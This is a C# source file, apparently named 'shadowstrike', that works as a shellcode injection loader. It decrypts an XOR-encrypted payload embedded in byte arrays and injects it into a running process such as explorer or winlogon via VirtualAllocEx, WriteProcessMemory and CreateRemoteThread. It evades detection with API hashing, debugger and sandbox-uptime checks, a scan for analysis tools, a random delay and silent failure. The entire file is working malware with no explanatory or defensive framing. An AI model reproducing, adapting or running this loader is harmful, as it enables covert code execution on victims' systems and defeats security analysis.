using System;
using System.Runtime.InteropServices;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;

namespace shadowstrike
{
    class Program
    {
        // API hashing
        private static uint FNV1aHash(string input)
        {
            uint hash = 2166136261;
            foreach (char c in input)
            {
                hash = (hash ^ c) * 16777619;
            }
            return hash;
        }

        // Delegates
        private delegate IntPtr OpenProcessDelegate(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        private delegate IntPtr VirtualAllocExDelegate(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        private delegate bool WriteProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
        private delegate IntPtr CreateRemoteThreadDelegate(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        private delegate bool VirtualProtectExDelegate(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        private delegate bool CloseHandleDelegate(IntPtr hObject);
        private delegate void SleepDelegate(uint dwMilliseconds);
        private delegate bool IsDebuggerPresentDelegate();

        static void Main(string[] args)
        {
            // Anti-analysis upfront
            if (DetectAnalysisEnvironment()) return;

            try
            {
                // Get target PID
                int targetPid = args.Length > 0 ? int.Parse(args[0]) : FindTargetProcess();

                // Resolve APIs with hashing
                var openProcess = GetApiDelegateByHash<OpenProcessDelegate>("kernel32.dll", FNV1aHash("OpenProcess"));
                var virtualAllocEx = GetApiDelegateByHash<VirtualAllocExDelegate>("kernel32.dll", FNV1aHash("VirtualAllocEx"));
                var writeProcessMemory = GetApiDelegateByHash<WriteProcessMemoryDelegate>("kernel32.dll", FNV1aHash("WriteProcessMemory"));
                var createRemoteThread = GetApiDelegateByHash<CreateRemoteThreadDelegate>("kernel32.dll", FNV1aHash("CreateRemoteThread"));
                var virtualProtectEx = GetApiDelegateByHash<VirtualProtectExDelegate>("kernel32.dll", FNV1aHash("VirtualProtectEx"));
                var closeHandle = GetApiDelegateByHash<CloseHandleDelegate>("kernel32.dll", FNV1aHash("CloseHandle"));
                var sleep = GetApiDelegateByHash<SleepDelegate>("kernel32.dll", FNV1aHash("Sleep"));

                if (openProcess == null || virtualAllocEx == null || writeProcessMemory == null ||
                    createRemoteThread == null || virtualProtectEx == null || closeHandle == null || sleep == null)
                {
                    return;
                }

                // Open process
                IntPtr hProcess = openProcess(0x1F0FFF, false, targetPid);
                if (hProcess == IntPtr.Zero) return;

                // Allocate memory
                IntPtr addr = virtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x04);
                if (addr == IntPtr.Zero)
                {
                    closeHandle(hProcess);
                    return;
                }

                // Get encrypted payload (embedded and obfuscated)
                byte[] encryptedPayload = GetEncryptedPayload();

                // Decrypt with embedded key
                byte[] shellcode = DecryptWithEmbeddedKey(encryptedPayload);

                // Write to memory
                IntPtr outSize;
                bool success = writeProcessMemory(hProcess, addr, shellcode, shellcode.Length, out outSize);
                if (!success)
                {
                    closeHandle(hProcess);
                    return;
                }

                // Change protection to RX
                uint oldProtect;
                success = virtualProtectEx(hProcess, addr, (uint)shellcode.Length, 0x20, out oldProtect);
                if (!success)
                {
                    closeHandle(hProcess);
                    return;
                }

                // Random delay
                sleep((uint)(new Random(Environment.TickCount).Next(500, 2000)));

                // Execute
                IntPtr hThread = createRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                if (hThread != IntPtr.Zero)
                {
                    closeHandle(hThread);
                }

                closeHandle(hProcess);
            }
            catch
            {
                // Silent failure
            }
        }

        private static byte[] GetEncryptedPayload()
        {
            byte[] part1 = { 0xC7, 0x39, 0x9D, 0xAC, 0x95, 0x1A, 0x0D, 0x52, 0xCF, 0x8B, 0xF3, 0x44, 0x81, 0x5F, 0x03, 0x44, 0x6D, 0x39, 0x2F, 0x9A, 0x00, 0xBA, 0x4A, 0x00, 0xAF, 0xC3, 0x39, 0x47, 0xD8, 0x47, 0xDA, 0x47, 0x1B, 0x39, 0x11, 0xFF, 0x2F, 0xB8, 0x8C, 0x63, 0x06, 0xC3, 0x39, 0x67, 0x90, 0x47, 0x60, 0xD5, 0x97, 0x4D, 0x7F, 0x34, 0x67, 0xDE, 0xE1, 0x13, 0x0E, 0x42, 0xBF, 0x54, 0xC1, 0xCE, 0xB3, 0xF8, 0x69, 0x30, 0x4F, 0x00, 0xEE, 0xA0, 0xE1, 0xD9, 0x8D, 0xB7, 0xFA, 0x14, 0x10, 0x69, 0xD0, 0x6D, 0x23, 0x7A, 0x1C, 0x47, 0xE0, 0x80, 0xC1, 0x52, 0xCF, 0x00, 0x32, 0x9D, 0xC0, 0x0F, 0x51, 0x5D, 0xBE, 0xB1, 0x6A, 0x2F, 0x2D, 0xF3 };
            byte[] part2 = { 0x11, 0x02, 0x8B, 0x00, 0xF2, 0x35, 0x89, 0x0E, 0x81, 0x9E, 0x73, 0x69, 0xFD, 0x1E, 0x28, 0xC3, 0x08, 0x1A, 0x30, 0x42, 0xF3, 0x9E, 0xF4, 0x87, 0x19, 0x14, 0xED, 0x39, 0x2F, 0x88, 0xC9, 0xB3, 0x00, 0x9B, 0xC2, 0xCA, 0xB3, 0xD4, 0xF8, 0xEF, 0x24, 0xE4, 0x77, 0x72, 0x52, 0x6C, 0x6D, 0xB7, 0xF8, 0x83, 0xBA, 0x53, 0xEA, 0x51, 0x4B, 0x4F, 0x75, 0x5C, 0x3A, 0xA1, 0x78, 0x09, 0xEE, 0xFE, 0x89, 0x16, 0x44, 0xCB, 0xAE, 0x5C, 0xC1, 0xDF, 0x10, 0x9E, 0x3F, 0xF9, 0x56, 0x49, 0xB5, 0xB3, 0x99, 0x13, 0x97, 0xD5, 0xEB, 0x4F, 0x81, 0x57, 0x10, 0x4C, 0x7A, 0x2B, 0x56, 0xCB, 0x89, 0xD2, 0x80, 0x00, 0x30, 0x6B, 0xEA, 0x54 };
            byte[] part3 = { 0x99, 0x55, 0x19, 0x9E, 0x29, 0x98, 0x55, 0xB7, 0x9A, 0x0D, 0x9C, 0x1B, 0x71, 0xFC, 0xC1, 0x27, 0x9F, 0x3C, 0x63, 0x15, 0x3B, 0x30, 0x48, 0x01, 0xEC, 0x14, 0x89, 0xD3, 0x23, 0x2B, 0xB3, 0x15, 0xC0, 0x46, 0xD8, 0xF0, 0x72, 0xCD, 0x1C, 0x48, 0x64, 0x49, 0x01, 0xFA, 0xCE, 0x4C, 0xF3, 0x41, 0x89, 0x86, 0xB5, 0x59, 0xB2, 0x80, 0x5F, 0xF2, 0x29, 0x85, 0xE7, 0x55, 0x30, 0x5E, 0xFE, 0x9C, 0x2A, 0x67, 0x50, 0x14, 0x3B, 0x71, 0x47, 0x09, 0xDF, 0xDB, 0x41, 0x39, 0xCF, 0x74, 0x67, 0x7F, 0xCA, 0x4E, 0x0F, 0x45, 0x6B, 0x3C, 0x2F, 0x81, 0x28, 0xC3, 0x01, 0x1A, 0x30, 0x4B, 0xFA, 0x9C, 0x02, 0x47, 0xAE, 0xD5, 0x73, 0xF8 };
            byte[] part4 = { 0xDF, 0x09, 0xDF, 0x18, 0xCE, 0x8D, 0x2F, 0x74, 0x67, 0x5D, 0x49, 0xC8, 0x3B, 0x05, 0x7A, 0x29, 0x52, 0xC1, 0x87, 0xBA, 0x48, 0xAB, 0x8E, 0x31, 0x2B, 0xB0, 0xB4, 0x6E, 0xAE, 0xC0, 0xBE, 0xB1, 0x6A, 0x42, 0x2C, 0x0D, 0x0F, 0x27, 0x2A, 0x63, 0x21, 0x15, 0xC0, 0x0F, 0x19, 0x96, 0xD7, 0x61, 0x56, 0xC1, 0x87, 0xBF, 0xF0, 0x9B, 0xA5, 0x8F, 0xF3, 0x4D, 0x88, 0x86, 0xA8, 0x54, 0x81, 0x73, 0xC7, 0x80, 0x3A, 0x0D, 0x14, 0xD1, 0x37, 0x8B, 0xCC, 0x40, 0x88, 0x8C, 0x95, 0x35, 0x65, 0xF8, 0xE8, 0x22, 0x25, 0xB3, 0x98, 0x3A, 0xCF, 0x9B, 0xB2, 0x15, 0x81, 0x57, 0x19, 0x9C, 0xC9, 0x39, 0x2F, 0x81, 0x24, 0x48, 0x99, 0xF6 };
            byte[] part5 = { 0x9C, 0x6E, 0x4D, 0xC0, 0x88, 0x86, 0x92, 0x5C, 0xB2, 0xB6, 0x53, 0x79, 0xAC, 0xBB, 0x48, 0xA2, 0x87, 0x02, 0x68, 0x5D, 0x49, 0xF6, 0x10, 0xAF, 0x39, 0xA8, 0xD6, 0x17, 0x9A, 0x27, 0x42, 0xAA, 0xCF, 0xF6, 0x9A, 0x4D, 0x81, 0x58, 0x08, 0x7D, 0x3B, 0x31, 0x1E, 0x48, 0x24, 0xAA, 0xAB, 0x52, 0x95, 0xCA, 0x08, 0x1E, 0xEF, 0x00, 0x61, 0xEA, 0xEE, 0x26, 0x47, 0x09, 0xDF, 0x87, 0xAF, 0x1F, 0xAE, 0x74, 0x67, 0x5C, 0x3F, 0xC1, 0xB8, 0x29, 0xC4, 0x8E, 0xE1, 0x00, 0x64, 0x31, 0x89, 0x7B, 0x09, 0xC3, 0x37, 0xE3, 0xB5, 0xBB, 0x10, 0xEA, 0xDC, 0x29, 0x74, 0x48, 0x3C, 0xBB, 0x06, 0x90, 0x3F, 0x3E, 0x10, 0x43, 0x3F, 0xDA };

            // Reassemble with junk operations
            byte[] assembled = new byte[part1.Length + part2.Length + part3.Length + part4.Length + part5.Length];
            Array.Copy(part1, 0, assembled, 0, part1.Length);
            Array.Copy(part2, 0, assembled, part1.Length, part2.Length);
            Array.Copy(part3, 0, assembled, part1.Length + part2.Length, part3.Length);
            Array.Copy(part4, 0, assembled, part1.Length + part2.Length + part3.Length, part4.Length);
            Array.Copy(part5, 0, assembled, part1.Length + part2.Length + part3.Length + part4.Length, part5.Length);

            return assembled;
        }

        private static byte[] DecryptWithEmbeddedKey(byte[] encryptedData)
        {
            // Embedded XOR key (obfuscated)
            byte[] xorKey = { 0x3B, 0x71, 0x1E, 0x48, 0x65, 0xF2, 0xC1, 0x52, 0xCF, 0x8B, 0xB2, 0x15, 0xC0, 0x0F, 0x51, 0x15 };

            // XOR decryption
            byte[] decrypted = new byte[encryptedData.Length];
            for (int i = 0; i < encryptedData.Length; i++)
            {
                decrypted[i] = (byte)(encryptedData[i] ^ xorKey[i % xorKey.Length]);
            }

            return decrypted;
        }

        private static bool DetectAnalysisEnvironment()
        {
            try
            {
                // Check for debugger
                if (IsDebuggerPresent()) return true;

                // Check for sandbox by checking uptime (sandboxes often have low uptime)
                if (GetSystemUptime() < TimeSpan.FromHours(1).TotalMilliseconds) return true;

                // Check for analysis tools
                if (IsAnalysisToolPresent()) return true;

                return false;
            }
            catch
            {
                return true;
            }
        }

        private static bool IsDebuggerPresent()
        {
            try
            {
                var isDebuggerPresent = GetApiDelegateByHash<IsDebuggerPresentDelegate>("kernel32.dll", FNV1aHash("IsDebuggerPresent"));
                if (isDebuggerPresent != null)
                {
                    return isDebuggerPresent();
                }
                return Debugger.IsAttached;
            }
            catch
            {
                return true;
            }
        }

        private static double GetSystemUptime()
        {
            try
            {
                return Environment.TickCount;
            }
            catch
            {
                return 0;
            }
        }

        private static bool IsAnalysisToolPresent()
        {
            try
            {
                // Check for common analysis tools
                string[] suspiciousProcesses = { "ollydbg", "ida", "wireshark", "procmon", "processhacker", "x64dbg", "x32dbg" };

                foreach (var process in Process.GetProcesses())
                {
                    try
                    {
                        string processName = process.ProcessName.ToLower();
                        foreach (var suspicious in suspiciousProcesses)
                        {
                            if (processName.Contains(suspicious))
                            {
                                return true;
                            }
                        }
                    }
                    catch
                    {
                        // Ignore inaccessible processes
                    }
                }
                return false;
            }
            catch
            {
                return false;
            }
        }

        private static int FindTargetProcess()
        {
            try
            {
                // Look for common processes
                string[] targetProcesses = { "notepad", "explorer", "svchost", "winlogon" };

                foreach (var name in targetProcesses)
                {
                    var processes = Process.GetProcessesByName(name);
                    if (processes.Length > 0)
                    {
                        return processes[0].Id;
                    }
                }

                return 928; // Fallback
            }
            catch
            {
                return 928;
            }
        }

        private static T GetApiDelegateByHash<T>(string module, uint functionHash) where T : Delegate
        {
            try
            {
                IntPtr moduleHandle = GetModuleHandle(module);
                if (moduleHandle == IntPtr.Zero) return null;

                string functionName = null;

                // Manual switch for C# 7.3 compatibility
                if (functionHash == FNV1aHash("OpenProcess"))
                    functionName = "OpenProcess";
                else if (functionHash == FNV1aHash("VirtualAllocEx"))
                    functionName = "VirtualAllocEx";
                else if (functionHash == FNV1aHash("WriteProcessMemory"))
                    functionName = "WriteProcessMemory";
                else if (functionHash == FNV1aHash("CreateRemoteThread"))
                    functionName = "CreateRemoteThread";
                else if (functionHash == FNV1aHash("VirtualProtectEx"))
                    functionName = "VirtualProtectEx";
                else if (functionHash == FNV1aHash("CloseHandle"))
                    functionName = "CloseHandle";
                else if (functionHash == FNV1aHash("Sleep"))
                    functionName = "Sleep";
                else if (functionHash == FNV1aHash("IsDebuggerPresent"))
                    functionName = "IsDebuggerPresent";

                if (functionName == null) return null;

                IntPtr functionAddress = GetProcAddress(moduleHandle, functionName);
                if (functionAddress == IntPtr.Zero) return null;

                return (T)Marshal.GetDelegateForFunctionPointer(functionAddress, typeof(T));
            }
            catch
            {
                return null;
            }
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}